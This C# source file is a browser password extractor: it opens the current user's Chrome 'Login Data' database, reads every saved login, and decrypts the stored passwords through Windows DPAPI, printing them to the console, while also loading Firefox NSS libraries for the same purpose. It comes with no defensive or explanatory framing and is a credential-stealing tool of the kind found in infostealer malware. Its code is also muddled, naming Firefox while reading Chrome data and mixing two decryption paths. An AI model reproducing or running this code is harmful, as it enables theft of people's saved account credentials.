using System;
using System.Collections.Generic;
using System.Text;
using System.Data.SQLite;
using System.IO;
using System.Runtime.InteropServices;
using System.ComponentModel;
using System.Security.Cryptography;
namespace FirefoxPasswordExtractor
{
    

    class Program
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct DATA_BLOB
        {
            public int cbData;
            public IntPtr pbData;
        }

        [Flags]
        private enum CryptProtectPromptFlags
        {
            // prompt on unprotect
            CRYPTPROTECT_PROMPT_ON_UNPROTECT = 0x1,

            // prompt on protect
            CRYPTPROTECT_PROMPT_ON_PROTECT = 0x2
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct CRYPTPROTECT_PROMPTSTRUCT
        {
            public int cbSize;
            public CryptProtectPromptFlags dwPromptFlags;
            public IntPtr hwndApp;
            public String szPrompt;
        }

        [Flags]
        private enum CryptProtectFlags
        {
            CRYPTPROTECT_UI_FORBIDDEN = 0x1,
            CRYPTPROTECT_LOCAL_MACHINE = 0x4,
            CRYPTPROTECT_CRED_SYNC = 0x8,
            CRYPTPROTECT_AUDIT = 0x10,
            CRYPTPROTECT_NO_RECOVERY = 0x20,
            CRYPTPROTECT_VERIFY_PROTECTION = 0x40
        }

        [DllImport("Crypt32.dll", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptUnprotectData(
            ref DATA_BLOB pDataIn,
            String szDataDescr,
            ref DATA_BLOB pOptionalEntropy,
            IntPtr pvReserved,
            ref CRYPTPROTECT_PROMPTSTRUCT pPromptStruct,
            CryptProtectFlags dwFlags,
            ref DATA_BLOB pDataOut
        );

        private static string Decrypt(byte[] pass)
        {
            DATA_BLOB blob = new DATA_BLOB();
            DATA_BLOB blobOut = new DATA_BLOB();
            IntPtr blobPtr = Marshal.AllocHGlobal(pass.Length);
            Marshal.Copy(pass, 0, blobPtr, pass.Length);
            blob.pbData = blobPtr;
            blob.cbData = pass.Length;
            string[] str = new string[1024];
            DATA_BLOB entropy = new DATA_BLOB();
            CRYPTPROTECT_PROMPTSTRUCT crypto = new CRYPTPROTECT_PROMPTSTRUCT();

            if (CryptUnprotectData(ref blob, null, ref entropy, IntPtr.Zero, ref crypto, 0, ref blobOut))
            {
                return Marshal.PtrToStringAnsi(blobOut.pbData);
            }

            else
            {
                return "UNPROTECT FAILED";
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct TSECItem
        {
            public int SECItemType;
            public int SECItemData;
            public int SECItemLen;
        }

        private static IntPtr NSS3;

        static string ProgramFilesDirectory()
        {
            return Environment.GetEnvironmentVariable("ProgramFiles");
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibraryEx(string lpFileName, IntPtr hFile, uint dwFlags);

        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll")]
        static extern IntPtr FreeLibrary(string lpFileName);

        [DllImport("kernel32.dll")]
        public extern static IntPtr GetProcAddress(int hwnd, string procedureName);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate long DLLFunctionDelegate(string configdir);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate long DLLFunctionDelegate2();

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate long DLLFunctionDelegate3(long slot, bool loadCerts, long wincx);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate int DLLFunctionDelegate4(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate int DLLFunctionDelegate5(ref TSECItem data, ref TSECItem result, int cx);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate int DLLFunctionDelegate6(long slot);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate int DLLFunctionDelegate7(ref TSECItem item, bool freeItem);



        private static long PK11_GetInternalKeySlot()
        {
            IntPtr pProc = GetProcAddress(NSS3.ToInt32(), "PK11_GetInternalKeySlot");
            DLLFunctionDelegate2 dll = (DLLFunctionDelegate2)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate2));
            return dll();
        }

        private static long NSS_Init(string configdir, string program)
        {
            try
            {
                string MozillaPath = ProgramFilesDirectory() + program;
                DLLFunctionDelegate dll = null;
                LoadLibrary(MozillaPath + "mozcrt19.dll");
                LoadLibrary(MozillaPath + "nspr4.dll");
                LoadLibrary(MozillaPath + "plc4.dll");
                LoadLibrary(MozillaPath + "plds4.dll");
                LoadLibrary(MozillaPath + "ssutil3.dll");
                LoadLibrary(MozillaPath + "nssutil3.dll");
                LoadLibrary(MozillaPath + "softokn3.dll");
                NSS3 = LoadLibrary(MozillaPath + "nss3.dll");
                IntPtr pProc = GetProcAddress(NSS3.ToInt32(), "NSS_Init");
                dll = (DLLFunctionDelegate)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate));
                return dll(configdir);
            }
            catch
            {
                return 0;
            }
        }


        private static long PK11_Authenticate(long slot, bool loadCerts, long wincx)
        {
            IntPtr pProc = GetProcAddress(NSS3.ToInt32(), "PK11_Authenticate");
            DLLFunctionDelegate3 dll = (DLLFunctionDelegate3)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate3));
            return dll(slot, loadCerts, wincx);
        }

        private static int PK11_FreeSlot(long slot)
        {
            IntPtr pProc = GetProcAddress(NSS3.ToInt32(), "PK11_FreeSlot");
            DLLFunctionDelegate6 dll = (DLLFunctionDelegate6)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate6));
            return dll(slot);
        }

        private static int SECItem_FreeItem(ref TSECItem item, bool freeItem)
        {
            IntPtr pProc = GetProcAddress(NSS3.ToInt32(), "SECItem_FreeItem");
            DLLFunctionDelegate7 dll = (DLLFunctionDelegate7)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate7));
            return dll(ref item, freeItem);
        }

        private static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
        {
            IntPtr pProc = GetProcAddress(NSS3.ToInt32(), "NSSBase64_DecodeBuffer");
            DLLFunctionDelegate4 dll = (DLLFunctionDelegate4)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate4));
            return dll(arenaOpt, outItemOpt, inStr, inLen);
        }

        private static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
        {
            IntPtr pProc = GetProcAddress(NSS3.ToInt32(), "PK11SDR_Decrypt");
            DLLFunctionDelegate5 dll = (DLLFunctionDelegate5)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate5));
            return dll(ref data, ref result, cx);
        }

        private static string Decrypt(string value)
        {
            new TSECItem();
            TSECItem tSecDec = new TSECItem();
            byte[] bvRet;

            StringBuilder se = new StringBuilder(value);
            int tValue = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, se, se.Length);
            if (tValue != 0)
            {
                TSECItem item = (TSECItem)Marshal.PtrToStructure(new IntPtr(tValue), typeof(TSECItem));
                if (PK11SDR_Decrypt(ref item, ref tSecDec, 0) == 0)
                {
                    if (tSecDec.SECItemLen != 0)
                    {
                        bvRet = new byte[tSecDec.SECItemLen];
                        Marshal.Copy(new IntPtr(tSecDec.SECItemData), bvRet, 0, tSecDec.SECItemLen);
                        return Encoding.ASCII.GetString(bvRet);
                    }
                }
                SECItem_FreeItem(ref item, true);
            }
            return string.Empty;
        }

        static void Main(string[] args)
        {
            SQLiteConnection connection = new SQLiteConnection
            {
                ConnectionString = @"Data Source=" + GetProfile() + @"\Login Data" + ";Version=3;"
            };
            connection.Open();
            if (connection.State == System.Data.ConnectionState.Open)
            {
                NSS_Init(GetProfile(), @"\Mozilla Firefox\");
                try
                {
                    long KeySlot = PK11_GetInternalKeySlot();
                    PK11_Authenticate(KeySlot, true, 0);
                }
                catch { }
                SQLiteDataReader reader = new SQLiteCommand("select * from logins", connection).ExecuteReader();
                while (reader.Read())
                {
                    
                    Console.WriteLine("0:" + reader[0].ToString());
                    Console.WriteLine("1:" + reader[1].ToString());
                    Console.WriteLine("2:" + reader[2].ToString());
                    Console.WriteLine("3:" + reader[3].ToString());
                    Console.WriteLine("4:" + reader[4].ToString());
                    var item = reader[5];
                    Console.WriteLine("5:" + Decrypt((byte[])item));
                    Console.WriteLine("6:" + reader[6].ToString());
                    Console.WriteLine("7:" + reader[7].ToString());
                    Console.WriteLine("8:" + reader[8].ToString());
                    Console.WriteLine("9:" + reader[9].ToString());
                    Console.WriteLine("10:" + reader[10].ToString());
                    Console.WriteLine("11:" + reader[11].ToString());
                    Console.WriteLine("12:" + reader[12].ToString());
                }
                Console.ReadLine();
            }

        }


        private static string GetProfile()
        {
            return @"C:\Users\" + Environment.UserName + @"\AppData\Local\Google\Chrome\User Data\Default";
        }
    }
}